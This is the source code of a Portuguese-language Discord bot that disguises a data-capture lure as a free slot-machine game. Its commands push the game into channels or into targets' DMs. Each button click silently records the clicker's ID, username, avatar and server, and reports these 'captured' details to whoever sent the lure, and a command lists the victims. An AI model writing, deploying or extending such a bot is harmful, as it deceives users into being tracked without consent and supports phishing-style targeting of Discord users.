const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const express = require('express');
const geoip = require('geoip-lite');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ]
});

const app = express();
const userLogs = {}; // Canal de logs de cada usuário
const capturedData = []; // Dados capturados

// Emojis pro slot
const fruits = ['🍒', '🍇', '🍊', '🍋', '🍉', '💎', '7️⃣'];

// Comandos
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  
  const prefix = '!';
  if (!message.content.startsWith(prefix)) return;
  
  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  
  // !ping
  if (cmd === 'ping') {
    return message.reply(`🏓 Ping: ${Date.now() - message.createdTimestamp}ms`);
  }
  
  // !gerar - Cria botão de slot
  if (cmd === 'gerar') {
    const embed = new EmbedBuilder()
      .setColor(0xff0000)
      .setTitle('🎰 ROleta da Sorte!')
      .setDescription('Clique no botão abaixo para girar e ganhar prêmios!\n\n💰 **Prêmios:**\n🍒🍒🍒 = 10 coins\n💎💎💎 = 100 coins\n7️⃣7️⃣7️⃣ = JACKPOT!')
      .setImage('https://media.giphy.com/media/3o7abtn7DuQjT0x7bW/giphy.gif');
    
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('slot_machine')
        .setLabel('🎰 GIRAR AGORA!')
        .setStyle(ButtonStyle.Danger)
    );
    
    // Envia no canal atual
    const msg = await message.reply({ 
      content: '🎰 **ROLETA DA SORTE** 🎰\nClique para ganhar prêmios!',
      embeds: [embed], 
      components: [row] 
    });
    
    // Salva quem criou pra enviar logs depois
    msg.creatorId = message.author.id;
    
    return;
  }
  
  // !enviar @usuario - Manda no PV da pessoa
  if (cmd === 'enviar') {
    const target = message.mentions.users.first();
    if (!target) return message.reply('❌ Marque alguém! Ex: !enviar @fulano');
    
    const embed = new EmbedBuilder()
      .setColor(0xff0000)
      .setTitle('🎰 ROleta da Sorte!')
      .setDescription('Clique no botão abaixo para girar e ganhar prêmios!')
      .setFooter({ text: 'Boa sorte! 🍀' });
    
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('slot_machine')
        .setLabel('🎰 GIRAR!')
        .setStyle(ButtonStyle.Success)
    );
    
    try {
      await target.send({
        content: '🎰 **Você recebeu uma rodada grátis na Roleta da Sorte!**',
        embeds: [embed],
        components: [row]
      });
      message.reply(`✅ Mensagem enviada no PV de ${target.tag}`);
    } catch (e) {
      message.reply('❌ Não consegui enviar DM. A pessoa pode ter DM fechada.');
    }
    return;
  }
  
  // !logs - Define canal de logs
  if (cmd === 'logs') {
    const channel = message.mentions.channels.first() || message.channel;
    userLogs[message.author.id] = channel.id;
    return message.reply(`✅ Logs configurados para: ${channel}`);
  }
  
  // !verdados - Mostra dados capturados
  if (cmd === 'verdados') {
    const myCaptures = capturedData.filter(c => c.creatorId === message.author.id);
    
    if (myCaptures.length === 0) {
      return message.reply('❌ Ninguém clicou ainda.');
    }
    
    let msg = `**📊 Dados Capturados (${myCaptures.length} pessoas):**\n\n`;
    
    myCaptures.slice(-10).forEach((c, i) => {
      msg += `${i+1}. **${c.username}**\n`;
      msg += `🆔 ID: \`${c.userId}\`\n`;
      msg += `📛 Nome: ${c.globalName || c.username}\n`;
      msg += `⏰ Quando: ${c.time}\n\n`;
    });
    
    return message.reply(msg);
  }
});

// Quando alguém clica no botão
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;
  if (interaction.customId !== 'slot_machine') return;
  
  // ===== CAPTURA OS DADOS =====
  const capture = {
    userId: interaction.user.id,
    username: interaction.user.username,
    tag: interaction.user.tag,
    globalName: interaction.user.globalName,
    avatar: interaction.user.displayAvatarURL(),
    guildId: interaction.guild?.id || 'DM',
    guildName: interaction.guild?.name || 'Mensagem Direta',
    time: new Date().toLocaleString('pt-BR'),
    creatorId: interaction.message?.creatorId || 'desconhecido'
  };
  
  capturedData.push(capture);
  
  // Envia logs pro criador
  const creatorId = interaction.message?.creatorId;
  if (creatorId) {
    // DM pro criador
    try {
      const creator = await client.users.fetch(creatorId);
      const embed = new EmbedBuilder()
        .setColor(0x00ff00)
        .setTitle('🎯 NOVO CLIQUE CAPTURADO!')
        .setThumbnail(capture.avatar)
        .addFields(
          { name: '👤 Usuário', value: capture.tag, inline: true },
          { name: '🆔 ID', value: capture.userId, inline: true },
          { name: '📍 Onde', value: capture.guildName, inline: true },
          { name: '⏰ Horário', value: capture.time, inline: true }
        );
      
      await creator.send({ embeds: [embed] });
    } catch (e) {}
    
    // Canal de logs
    const channelId = userLogs[creatorId];
    if (channelId) {
      const channel = await client.channels.fetch(channelId).catch(() => null);
      if (channel) {
        channel.send(
          `🎯 **NOVO CLIQUE!**\n` +
          `👤 ${capture.tag} (\`${capture.userId}\`)\n` +
          `📍 ${capture.guildName}\n` +
          `⏰ ${capture.time}`
        );
      }
    }
  }
  
  // ===== ANIMAÇÃO DO SLOT =====
  await interaction.deferUpdate(); // "Pensa..."
  
  // Gira 3 vezes mostrando emojis aleatórios
  const msg = interaction.message;
  
  for (let i = 0; i < 3; i++) {
    const tempEmbed = EmbedBuilder.from(msg.embeds[0])
      .setDescription(`🎰 Girando... ${fruits[Math.floor(Math.random() * fruits.length)]} ${fruits[Math.floor(Math.random() * fruits.length)]} ${fruits[Math.floor(Math.random() * fruits.length)]}`);
    
    await msg.edit({ embeds: [tempEmbed] });
    await new Promise(r => setTimeout(r, 500));
  }
  
  // Resultado final
  const result = [
    fruits[Math.floor(Math.random() * fruits.length)],
    fruits[Math.floor(Math.random() * fruits.length)],
    fruits[Math.floor(Math.random() * fruits.length)]
  ];
  
  const isWin = result[0] === result[1] && result[1] === result[2];
  const isJackpot = result.every(f => f === '7️⃣');
  
  let resultText = `${result[0]} ${result[1]} ${result[2]}\n\n`;
  
  if (isJackpot) {
    resultText += '🎉 **JACKPOT!!!** 🎉\nVocê ganhou 1000 coins!';
  } else if (isWin) {
    resultText += `✅ **Você ganhou!**\n3 ${result[0]} = 50 coins!`;
  } else {
    resultText += '❌ **Não foi dessa vez...**\nTente novamente!';
  }
  
  const finalEmbed = new EmbedBuilder()
    .setColor(isWin ? 0x00ff00 : 0xff0000)
    .setTitle('🎰 RESULTADO')
    .setDescription(resultText)
    .setFooter({ text: `Jogado por: ${capture.tag}` });
  
  // Remove o botão (pra não clicar de novo) ou desabilita
  const disabledRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('slot_machine')
      .setLabel('🎰 JOGAR NOVAMENTE')
      .setStyle(ButtonStyle.Secondary)
      .setDisabled(true)
  );
  
  await msg.edit({ embeds: [finalEmbed], components: [disabledRow] });
  
  // Manda resultado no PV de quem clicou
  try {
    await interaction.user.send(
      `🎰 **Resultado da sua jogada:**\n` +
      `${result[0]} ${result[1]} ${result[2]}\n\n` +
      (isWin ? '🎉 Parabéns! Você ganhou!' : '❌ Não foi dessa vez...')
    );
  } catch (e) {}
});

// Health check pro Render
app.get('/', (req, res) => {
  res.json({ 
    status: 'online', 
    bot: client.user?.tag || 'starting...',
    captures: capturedData.length 
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 Servidor: ${PORT}`));

client.login(process.env.DISCORD_TOKEN);
client.once('ready', () => console.log(`🤖 Bot logado: ${client.user.tag}`));
